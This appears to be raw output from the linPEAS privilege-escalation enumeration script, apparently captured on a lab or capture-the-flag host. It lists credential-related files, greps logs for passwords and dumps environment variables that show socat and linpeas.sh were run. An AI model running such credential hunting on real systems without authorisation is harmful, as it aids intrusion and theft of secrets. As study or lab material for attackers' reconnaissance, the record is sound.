+/etc/credstore                                                                                                                                                        
+/etc/credstore.encrypted
+/etc/pam.d/common-password
+/home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/cargo/reference/credential-provider-protocol.html
+/home/adalberto/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/share/doc/rust/html/unstable-book/library-features/peer-credentials-unix-socket.html
+/usr/bin/systemd-ask-password
+/usr/bin/systemd-tty-ask-password-agent
+/usr/lib/git-core/git-credential
+/usr/lib/git-core/git-credential-cache
+/usr/lib/git-core/git-credential-cache--daemon
+/usr/lib/git-core/git-credential-store
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/mysql/plugin/validate_password.so
+/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-312.pyc
+/usr/lib/python3/dist-packages/launchpadlib/credentials.py
+/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-312.pyc
+/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-312.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-312.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
+/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.service
+/usr/lib/systemd/system/systemd-ask-password-wall.path
+/usr/lib/systemd/system/systemd-ask-password-wall.service
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/tmpfiles.d/credstore.conf
+/usr/share/doc/git/contrib/credential
+/usr/share/pam/common-password
+/usr/share/pam/common-password.md5sums
+/var/cache/debconf/passwords.dat
+/var/lib/pam/password
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+
+╔══════════╣ Searching passwords inside logs (limit 70)
+/var/log/apt/history.log:Commandline: apt-get install --reinstall base-passwd                                                                                         
+/var/log/apt/history.log:Commandline: apt-get install --reinstall passwd
+/var/log/apt/history.log:Reinstall: base-passwd:amd64 (3.6.3build1)
+/var/log/apt/history.log:Reinstall: passwd:amd64 (1:4.13+dfsg1-4ubuntu3)
+/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.34); however:
+/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
+/var/log/bootstrap.log: base-passwd depends on libselinux1 (>= 3.1~); however:
+/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.6.3build1_amd64.deb ...
+/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.13+dfsg1-4ubuntu3_amd64.deb ...
+/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
+/var/log/bootstrap.log:Selecting previously unselected package passwd.
+/var/log/bootstrap.log:Setting up base-passwd (3.6.3build1) ...
+/var/log/bootstrap.log:Setting up passwd (1:4.13+dfsg1-4ubuntu3) ...
+/var/log/bootstrap.log:Shadow passwords are now on.
+/var/log/bootstrap.log:Unpacking base-passwd (3.6.3build1) ...
+/var/log/bootstrap.log:Unpacking base-passwd (3.6.3build1) over (3.6.3build1) ...
+/var/log/bootstrap.log:Unpacking passwd (1:4.13+dfsg1-4ubuntu3) ...
+/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
+/var/log/dpkg.log:2025-05-29 02:14:28 configure base-passwd:amd64 3.6.3build1 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:28 install base-passwd:amd64 <none> 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:28 status half-configured base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:28 status half-installed base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:28 status installed base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:28 status unpacked base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:30 status half-configured base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:30 status half-installed base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:30 status unpacked base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:30 upgrade base-passwd:amd64 3.6.3build1 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:33 install passwd:amd64 <none> 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:14:33 status half-installed passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:14:34 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:14:36 configure base-passwd:amd64 3.6.3build1 <none>
+/var/log/dpkg.log:2025-05-29 02:14:36 status half-configured base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:36 status installed base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:36 status unpacked base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:37 configure passwd:amd64 1:4.13+dfsg1-4ubuntu3 <none>
+/var/log/dpkg.log:2025-05-29 02:14:37 status half-configured passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:14:37 status installed passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:14:37 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:14:52 status half-configured base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:52 status half-installed base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:52 status unpacked base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:52 upgrade base-passwd:amd64 3.6.3build1 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:53 configure base-passwd:amd64 3.6.3build1 <none>
+/var/log/dpkg.log:2025-05-29 02:14:53 status half-configured base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:53 status installed base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:14:53 status unpacked base-passwd:amd64 3.6.3build1
+/var/log/dpkg.log:2025-05-29 02:20:46 configure passwd:amd64 1:4.13+dfsg1-4ubuntu3 <none>
+/var/log/dpkg.log:2025-05-29 02:20:46 status half-configured passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:20:46 status half-installed passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:20:46 status installed passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:20:46 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:20:46 upgrade passwd:amd64 1:4.13+dfsg1-4ubuntu3 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:22:46 configure passwd:amd64 1:4.13+dfsg1-4ubuntu3.2 <none>
+/var/log/dpkg.log:2025-05-29 02:22:46 status half-configured passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:22:46 status half-configured passwd:amd64 1:4.13+dfsg1-4ubuntu3.2
+/var/log/dpkg.log:2025-05-29 02:22:46 status half-installed passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:22:46 status installed passwd:amd64 1:4.13+dfsg1-4ubuntu3.2
+/var/log/dpkg.log:2025-05-29 02:22:46 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3
+/var/log/dpkg.log:2025-05-29 02:22:46 status unpacked passwd:amd64 1:4.13+dfsg1-4ubuntu3.2
+/var/log/dpkg.log:2025-05-29 02:22:46 upgrade passwd:amd64 1:4.13+dfsg1-4ubuntu3 1:4.13+dfsg1-4ubuntu3.2
+
+╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
+APACHE_LOCK_DIR=/var/lock/apache2
+APACHE_LOG_DIR=/var/log/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_RUN_GROUP=www-data
+APACHE_RUN_USER=www-data
+HOME=/home/adalberto
+LANG=C.UTF-8
+LC_CTYPE=C.UTF-8
+LOGNAME=adalberto
+MAIL=/var/mail/adalberto
+OLDPWD=/tmp
+PWD=/tmp
+PWD=/var/www/blogo
+SHELL=/bin/bash
+SHLVL=3
+SHLVL=4
+SHLVL=5
+SHLVL=6
+SOCAT_PID=2430
+SOCAT_PPID=2430
+SOCAT_VERSION=1.7.3.0
+TERM=xterm
+USER=adalberto
+_=./linpeas.sh
+_=./socat
+_=/bin/bash
+_=/usr/bin/bash
+_=/usr/bin/cat
+_=/usr/bin/dd
+_=/usr/bin/grep
+_=/usr/bin/script
+_=/usr/bin/sleep
+_=/usr/bin/su
+
+
+                                ╔════════════════╗
+════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                    
+                                ╚════════════════╝                                                                                                                    
+Regexes to search for API keys aren't activated, use param '-r' 
+
